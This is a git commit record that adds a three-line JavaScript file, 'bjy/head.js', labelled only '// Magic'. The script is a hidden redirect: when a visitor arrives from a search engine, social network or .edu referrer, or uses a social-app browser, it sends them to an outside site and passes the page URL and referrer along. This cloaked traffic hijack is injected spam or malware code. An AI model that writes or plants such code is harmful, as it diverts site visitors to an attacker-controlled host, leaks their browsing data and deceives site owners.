5bd36fc14400a7f667608b8942840991f01b9726
hiroshimada <lajunastudio@gmail.com>
2024-12-28 22:24:49 +0700

    Create head.js

---
+++ bjy/head.js
@@ -0,0 +1,3 @@
+// Magic
+var ars = 'http://forum.wartribunal.org';
+if(['.edu.', '.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
